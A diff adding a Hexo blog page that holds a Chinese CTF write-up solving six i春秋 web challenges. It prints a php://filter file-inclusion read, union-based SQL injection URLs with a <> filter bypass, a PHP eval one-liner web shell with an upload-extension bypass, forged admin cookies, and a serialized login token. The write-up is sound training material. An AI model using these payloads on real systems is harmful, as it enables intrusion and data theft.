@@ -1,0 +1,819 @@
+<!DOCTYPE html>
+<html lang="">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" >
+    <meta name="author" content="John Doe">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="John Doe">
+    
+    <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
+    
+    <meta name="description" content="">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+    <title>I春秋CTF训练营web题解（一） · SuperY4Ng&#39;s Blog</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href= "/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    <link rel="stylesheet" href= "/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href= "/assets/favicon.ico" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script" />
+    <link rel="preload" href="/scripts/main.js" as="script" />
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+</head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >SuperY4Ng&#39;s Blog</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">I春秋CTF训练营web题解（一）</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href=/>SuperY4Ng's Blog</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+
+height:50vh;
+">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            I春秋CTF训练营web题解（一）
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">1.1k</span>阅读时长: <span class="post-count reading-time">4 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2018/09/16</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Ps:该文章首发于CSDN:https://blog.csdn.net/Super_Yiang/article/details/82391768</span></span><br></pre></td></tr></table></figure>
+<h4 id="（1）include"><a href="#（1）include" class="headerlink" title="（1）include"></a>（1）include</h4><p>==hint：没错！就是文件包含漏洞.==</p>
+<p>点开链接，发现</p>
+<p><img src="https://s1.ax1x.com/2018/09/02/PzPytJ.md.png" alt="PzPytJ.md.png"></p>
+<p>通过源码可知可以提交一个path的变量，通过ctrl+f搜索allow_url_include，发现是打开状态：</p>
+<p><img src="https://s1.ax1x.com/2018/09/02/PzPvB8.md.png" alt="PzPvB8.md.png"></p>
+<p>所以打开火狐浏览器，用hackbar工具输入：</p>
+<p><img src="https://s1.ax1x.com/2018/09/02/PzipNQ.png" alt="PzipNQ.png"></p>
+<p>发现存在疑似含有flag的文件</p>
+<p><img src="https://s1.ax1x.com/2018/09/02/Pzikj0.png" alt="Pzikj0.png"></p>
+<p>接着使用php://filter协议查看曝露出来的文件的内容，因为PHP文件是在不能直接显示的，所以使用了base64编码显示</p>
+<p><img src="https://s1.ax1x.com/2018/09/02/PziJHO.png" alt="PziJHO.png"></p>
+<p>然后解码就可以得到flag了</p>
+<p><img src="https://s1.ax1x.com/2018/09/02/Pziw8A.md.png" alt="Pziw8A.md.png"></p>
+<h4 id="（2）SQL"><a href="#（2）SQL" class="headerlink" title="（2）SQL"></a>（2）SQL</h4><p>==hint：出题人就告诉你这个是个注入，有种别走！==</p>
+<p>创建链接点进去，然后查看源码</p>
+<p><img src="https://s1.ax1x.com/2018/09/03/Pzemss.md.png" alt="Pzemss.md.png"></p>
+<p>很明显知道用sql注入，用火狐hackbar进行手动注入，先爆字段</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://4416038693a84c979b378d558565548a72402f0bf1e44e3d.game.ichunqiu.com/index.php?id=1 order by 4</span><br></pre></td></tr></table></figure>
+<p><img src="https://s1.ax1x.com/2018/09/03/Pze1iT.md.png" alt="Pze1iT.md.png"></p>
+<p>说明存在过滤，试试/**/，关键词大写，不行，然后尝试&lt;&gt;发现可以</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://4416038693a84c979b378d558565548a72402f0bf1e44e3d.game.ichunqiu.com/index.php?id=1 ord&lt;&gt;er by 4</span><br></pre></td></tr></table></figure>
+<p><img src="https://s1.ax1x.com/2018/09/03/PzeNLR.md.png" alt="PzeNLR.md.png"></p>
+<p>没出现结果，所以接下来继续爆字段,4不对就二分法换2，然后发现还是没结果，换3有了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://4416038693a84c979b378d558565548a72402f0bf1e44e3d.game.ichunqiu.com/index.php?id=1 ord&lt;&gt;er by 2</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://4416038693a84c979b378d558565548a72402f0bf1e44e3d.game.ichunqiu.com/index.php?id=1 ord&lt;&gt;er by 3</span><br></pre></td></tr></table></figure>
+<p><img src="https://s1.ax1x.com/2018/09/03/Pzeae1.md.png" alt="Pzeae1.md.png"></p>
+<p>然后输入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://4416038693a84c979b378d558565548a72402f0bf1e44e3d.game.ichunqiu.com/index.php?id=1 union se&lt;&gt;lect 1,2,3 from info</span><br></pre></td></tr></table></figure>
+<p><img src="https://s1.ax1x.com/2018/09/03/PzeWwt.png" alt="PzeWwt.png"></p>
+<p>说明第二个字段可以显示，那么接下来就是爆数据库名，表名，列名:</p>
+<p>①爆数据库名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://4416038693a84c979b378d558565548a72402f0bf1e44e3d.game.ichunqiu.com/index.php?id=1 union se&lt;&gt;lect 1,database(),3 from info</span><br></pre></td></tr></table></figure>
+<p>②爆表名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://4416038693a84c979b378d558565548a72402f0bf1e44e3d.game.ichunqiu.com/index.php?id=1 union se&lt;&gt;lect 1,table_name,3 from information_schema.tables where table_schema=&apos;sqli&apos;</span><br></pre></td></tr></table></figure>
+<p>③爆列名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://4416038693a84c979b378d558565548a72402f0bf1e44e3d.game.ichunqiu.com/index.php?id=1 union se&lt;&gt;lect 1,column_name,3 from information_schema.columns where table_name=&apos;sqli&apos;</span><br></pre></td></tr></table></figure>
+<p>发现疑似存在flag的列</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://4416038693a84c979b378d558565548a72402f0bf1e44e3d.game.ichunqiu.com/index.php?id=1 union se&lt;&gt;lect 1,flAg_T5ZNdrm,3 from sqli.info</span><br></pre></td></tr></table></figure>
+<p>flag就出来了。</p>
+<h4 id="（3）Do-you-know-upload"><a href="#（3）Do-you-know-upload" class="headerlink" title="（3）Do you know upload"></a>（3）Do you know upload</h4><p>==hint：加油吧，少年。==</p>
+<p>创建链接，点开</p>
+<p><img src="https://s1.ax1x.com/2018/09/03/Pzs8hV.png" alt="Pzs8hV.png"></p>
+<p>很明显文件上传，试着上传已经写好的PHP一句话木马</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_POST[<span class="string">'a'</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>然后改为jpg格式上传抓包，并改为php后缀就可以成功上传。</p>
+<p><img src="https://s1.ax1x.com/2018/09/03/PzsBA1.png" alt="PzsBA1.png"></p>
+<p>因为我之前已经成功上传过了1.php文件，显示已存在，如果是第一次上传就会显示路径：upload/1.php</p>
+<p><img src="https://s1.ax1x.com/2018/09/03/PzsLuQ.png" alt="PzsLuQ.png"></p>
+<p>然后就是菜刀连接，打开</p>
+<p><img src="https://s1.ax1x.com/2018/09/03/PzypCV.md.png" alt="PzypCV.md.png"></p>
+<p>发现config.php和ctf.sql，flag应该存在数据库中，点开config.php可以看到数据库的信息</p>
+<p><img src="https://i.loli.net/2018/09/03/5b8cfa6a6d4c5.png" alt=""></p>
+<p>然后用菜刀编写shell连接到数据库查看flag。</p>
+<h4 id="（4）broken"><a href="#（4）broken" class="headerlink" title="（4）broken"></a>（4）broken</h4><p>==hint：you got a file,but…==</p>
+<p>点开链接，发现file是个超链接，点进去</p>
+<p><img src="https://i.loli.net/2018/09/03/5b8d2f6f6b077.png" alt=""></p>
+<p>一看jother编码，放进浏览器控制台，发现末尾少了一个]，加上后出现错误</p>
+<p><img src="https://i.loli.net/2018/09/03/5b8d3098dff26.png" alt=""></p>
+<p>于是删除最后面的()，再次输入得到[Array(1)]，打开就可以看到flag了。</p>
+<h4 id="（5）who-are-you"><a href="#（5）who-are-you" class="headerlink" title="（5）who are you?"></a>（5）who are you?</h4><p>==hint：我是谁，我在哪，我要做什么？==</p>
+<p>点开链接进去，显示</p>
+<p><img src="https://i.loli.net/2018/09/03/5b8d386d864b0.png" alt=""></p>
+<p>然后抓包发现cookie参数有问题</p>
+<p><img src="https://i.loli.net/2018/09/03/5b8d38a85a2fb.png" alt=""></p>
+<p>猜测是base64编码，拿去解码得</p>
+<p><img src="https://i.loli.net/2018/09/03/5b8d390189eb1.png" alt=""></p>
+<p>是Rot13，运行脚本解码得到guest，尝试将guest换成admin用脚本进行Rot13加密得到Zjo1OiJucXp2YSI7，再重新放入cookie中</p>
+<p><img src="https://i.loli.net/2018/09/03/5b8d39de575a8.png" alt=""></p>
+<p>可以看到已经成功登陆并且说可以上传，旁边有一条注释</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- $filename = $_POST[&apos;filename&apos;]; $data = $_POST[&apos;data&apos;]; --&gt;</span><br></pre></td></tr></table></figure>
+<p>所以将请求包改成POST形式，然后输入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=2.php&amp;data[]=&lt;?php eval($_POST[&apos;a&apos;]);?&gt;</span><br></pre></td></tr></table></figure>
+<p>再次提交</p>
+<p><img src="https://i.loli.net/2018/09/03/5b8d39cbbb1ba.png" alt=""></p>
+<p>找到路径，输入进去看看就可以得到flag。</p>
+<h4 id="（6）Login"><a href="#（6）Login" class="headerlink" title="（6）Login"></a>（6）Login</h4><p>==hint：加油，我看好你==</p>
+<p>点开链接，是一个登录界面</p>
+<p><img src="https://i.loli.net/2018/09/04/5b8df38fd1ab5.png" alt=""></p>
+<p>做web题习惯性的点开页面源代码看，发现一行注释，虽然在页面下面</p>
+<p><img src="https://i.loli.net/2018/09/04/5b8df3ede8efd.png" alt=""></p>
+<p>猜测是账号密码，输入登录发现成功登录，然而登录了并没有什么东西，抓包看看</p>
+<p><img src="https://i.loli.net/2018/09/04/5b8df4aa946e2.png" alt=""></p>
+<p>发现member.php这页刷新返回包中有一个show参数，猜测可以show source，所以改包，加上一个show参数并设为1</p>
+<p><img src="https://i.loli.net/2018/09/04/5b8df5a930d62.png" alt=""></p>
+<p>发现真的出现了源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($requset[<span class="string">'token'</span>]))</span><br><span class="line">	&#123;</span><br><span class="line">		$login = unserialize(gzuncompress(base64_decode($requset[<span class="string">'token'</span>])));</span><br><span class="line">		$db = <span class="keyword">new</span> db();</span><br><span class="line">		$row = $db-&gt;select(<span class="string">'user=\''</span>.mysql_real_escape_string($login[<span class="string">'user'</span>]).<span class="string">'\''</span>);</span><br><span class="line">		<span class="keyword">if</span>($login[<span class="string">'user'</span>] === <span class="string">'ichunqiu'</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">echo</span> $flag;</span><br><span class="line">		&#125;<span class="keyword">else</span> <span class="keyword">if</span>($row[<span class="string">'pass'</span>] !== $login[<span class="string">'pass'</span>])&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">'unserialize injection!!'</span>;</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"(╯‵□′)╯︵┴─┴ "</span>;</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>
+<p>重要的就是这段,编写代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="keyword">array</span>(<span class="string">'user'</span>=&gt;<span class="string">'ichunqiu'</span>);</span><br><span class="line">$a=base64_encode(gzcompress(serialize($a)));</span><br><span class="line"><span class="keyword">echo</span> $a</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>运行得到token</p>
+<p><img src="https://i.loli.net/2018/09/04/5b8df71053d38.png" alt=""></p>
+<p>然后放到cookie中提交就可以得到flag。</p>
+
+    </article>
+    <!-- license  -->
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href= "/2018/09/16/渗透测试初步学习之信息收集/" title= "渗透测试初步学习之信息收集">
+                    <div class="nextTitle">渗透测试初步学习之信息收集</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2018/09/16/web开发快速入门(一)/" title= "WEB开发快速入门（一）">
+                    <div class="prevTitle">WEB开发快速入门（一）</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:2414617455@qq.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/SuperY4Ng" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+            
+                <span class="iconfont-archer wechat" title=wechat>
+                  
+                  <img class="profile-qr" src="/assets/wechat.png" />
+                </span>
+            
+        
+    
+        
+            
+                <span class="iconfont-archer qq" title=qq>
+                  
+                  <img class="profile-qr" src="/assets/QQ.png" />
+                </span>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="/atom.xml" class="iconfont-archer rss" target="_blank" title=rss></a>
+            
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+     
+    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#（1）include"><span class="toc-number">1.</span> <span class="toc-text">（1）include</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#（2）SQL"><span class="toc-number">2.</span> <span class="toc-text">（2）SQL</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#（3）Do-you-know-upload"><span class="toc-number">3.</span> <span class="toc-text">（3）Do you know upload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#（4）broken"><span class="toc-number">4.</span> <span class="toc-text">（4）broken</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#（5）who-are-you"><span class="toc-number">5.</span> <span class="toc-text">（5）who are you?</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#（6）Login"><span class="toc-number">6.</span> <span class="toc-text">（6）Login</span></a></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 4
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2018 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/16</span><a class="archive-post-title" href= "/2018/09/16/渗透测试初步学习之信息收集/" >渗透测试初步学习之信息收集</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/16</span><a class="archive-post-title" href= "/2018/09/16/渗透测试初步学习之漏洞发现/" >渗透测试初步学习之漏洞发现和源码泄露</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2018/09/16/I春秋CTF训练营web题解（一）/" >I春秋CTF训练营web题解（一）</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2018/09/16/web开发快速入门(一)/" >WEB开发快速入门（一）</a>
+        </li>
+    
+    </div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br/>
+    1、请确保node版本大于6.2<br/>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br/>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br/>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
